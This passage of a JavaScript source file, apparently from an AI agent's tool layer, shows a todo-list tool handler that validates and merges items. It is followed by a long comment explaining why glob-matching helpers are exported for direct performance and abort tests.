    return { content: 'EINVAL: todos must be an array', isError: true }
  }

  // Validate every item BEFORE mutating so a bad item halfway through
  // doesn't leave the store in a partially-applied state.
  const seenIds = new Set()
  for (let i = 0; i < todos.length; i++) {
    const t = todos[i]
    if (!t || typeof t !== 'object') {
      return { content: `EINVAL: todos[${i}] must be an object`, isError: true }
    }
    if (typeof t.id !== 'string' || t.id.length === 0) {
      return { content: `EINVAL: todos[${i}].id is required (string)`, isError: true }
    }
    // #4138: reject duplicate ids within a single call. A duplicate is
    // almost certainly a model bug; rejecting it lets the model see the
    // mistake and self-correct rather than letting the last write win
    // silently. Across separate calls, merge-by-id is unchanged.
    // JSON.stringify on the id (same shape used for `status` below) keeps
    // the error parseable when an id contains quotes / newlines / control
    // chars — raw single-quotes would mangle.
    if (seenIds.has(t.id)) {
      return {
        content: `EINVAL: todos[${i}].id ${JSON.stringify(t.id)} duplicates an earlier entry in this call`,
        isError: true,
      }
    }
    seenIds.add(t.id)
    if (typeof t.content !== 'string' || t.content.length === 0) {
      return { content: `EINVAL: todos[${i}].content is required (string)`, isError: true }
    }
    if (typeof t.status !== 'string' || !TODO_STATUSES.has(t.status)) {
      return {
        content: `EINVAL: todos[${i}].status must be one of pending|in_progress|completed (got ${JSON.stringify(t.status)})`,
        isError: true,
      }
    }
    if (t.activeForm !== undefined && typeof t.activeForm !== 'string') {
      return { content: `EINVAL: todos[${i}].activeForm must be a string when present`, isError: true }
    }
  }

  // Apply the merge.
  for (const t of todos) {
    const entry = { id: t.id, content: t.content, status: t.status }
    if (typeof t.activeForm === 'string') entry.activeForm = t.activeForm
    todoStore.set(t.id, entry)
  }

  // Build a readable summary from the FULL current list (post-merge).
  // The model already sees the call in its history; this confirmation
  // exists so a partial call still surfaces unrelated items. The output
  // is capped so a runaway list (or pathologically long `content`)
  // doesn't balloon conversation history toward token-limit cliffs —
  // the full Map stays server-side; only the rendered summary is capped.
  const all = [...todoStore.values()]
  const counts = { pending: 0, in_progress: 0, completed: 0 }
  for (const t of all) counts[t.status]++

  const header = `Todo list (${all.length} items): ${counts.in_progress} in progress, ${counts.pending} pending, ${counts.completed} completed`
  const visible = all.slice(0, TODOWRITE_MAX_ITEMS_RENDERED)
  const lines = [header]
  for (const t of visible) {
    const marker = t.status === 'completed' ? '[x]' : t.status === 'in_progress' ? '[~]' : '[ ]'
    const content = t.content.length > TODOWRITE_MAX_CONTENT_RENDERED
      ? t.content.slice(0, TODOWRITE_MAX_CONTENT_RENDERED) + '…'
      : t.content
    lines.push(`  ${marker} ${content} (${t.id})`)
  }
  if (all.length > visible.length) {
    lines.push(`  … (showing first ${visible.length} of ${all.length}; full list retained server-side)`)
  }
  return { content: lines.join('\n'), isError: false }
}

const TODOWRITE_MAX_ITEMS_RENDERED = 100
const TODOWRITE_MAX_CONTENT_RENDERED = 200

// Exported for testing — #7898: proving `caseCheckPasses` stays polynomial on
// an adversarial pattern is cheapest called DIRECTLY, without the filesystem
// I/O a full `executeBuiltinTool` Glob call carries.
//
// `caseCheckPasses` is itself DEAD CODE in production since #7901/#7910
// replaced `fs.glob` with `walkGlob` on the host path — `runGlob` never calls
// it — so a direct-call test of `caseCheckPasses` alone proves the SHARED
// per-segment matcher (`segmentMatches`/`advanceToken`) is fast when called
// through `caseCheckPasses`'s path-level wrapper, but says nothing about the
// function that actually ships: `walkGlob`, which calls `segmentMatches`
// itself, once per real directory entry `opendir` reads. `segmentMatches` is
// exported alongside it for exactly this reason (#7910 review round 2) — a
// direct call proves the LIVE matcher stays fast at the SAME full adversarial
// scale (a 5000-char synthetic string) `caseCheckPasses`'s own tests use,
// which an integration-level `executeBuiltinTool` call cannot: a real
// filename cannot be 5000+ bytes (most filesystems cap a single path
// component around 255), and at a filesystem-safe scale the absolute-time
// gap between O(n) and a REGRESSED O(n²) is too small relative to
// `executeBuiltinTool`'s own overhead (root resolution, the deadline race,
// confinement) to assert reliably — measured directly: the exact mutation
// that makes the 5000-char direct-call test take 69.5s made a 250-char
// on-disk equivalent take only 120ms, comfortably under ANY CI-safe budget.
// The integration-level tests this suite keeps therefore assert CORRECTNESS
// (matched/not-matched) and basic non-hang sanity through the real dispatch,
// not a tight complexity bound — that proof lives in the direct calls, at
// full scale, where the gap is actually measurable.
//
// `walkGlob` (#7901) is exported for a different reason: `runGlob`'s own
// deadline/abort RACE (`Promise.race([collect, deadlineReached])`) resolves
// via `deadlineReached` — a timer/abort callback independent of whether the
// walk itself ever notices `state.stop` — so a `executeBuiltinTool`-level
// test proves the TOOL CALL returns promptly on abort, but NOT that the walk
// stops generating filesystem work in the background afterward, which is the
// actual #7356 defect (an orphaned walk left running, and running CPU/RSS,
// after the tool result was already sent). Calling `walkGlob` directly and
// timing how long its OWN promise takes to settle after `state.stop` is set
// proves that property precisely. `expandBraces` (#7918 review) is exported
// for the same reason: its cost bound is a property of the function itself,
// and timing it through a whole Glob call would fold in the walk.
//
// `parseRangeGroup`/`hasRangeBrace` (#7951) are exported for the same
// direct-call, full-scale reason as `expandBraces`: the range arithmetic
// (padding width, step direction, the zero-step refusal) is a property of
// `parseRangeGroup` alone, and `hasRangeBrace`'s gate shape needs its own
// proof independent of `expandBraces` ever running. `hostBraceDepthExceeded`
// (#7951 review) likewise: it runs over every expanded pattern before the
// walk, so its own cost is timed directly, apart from the walk.
export {
  compileCaseCheck,
  caseCheckPasses,
  segmentMatches,
  walkGlob,
  expandBraces,
  GLOB_BRACE_EXPANSION_CAP,
  parseRangeGroup,
  hasRangeBrace,
  hostBraceDepthExceeded,
}
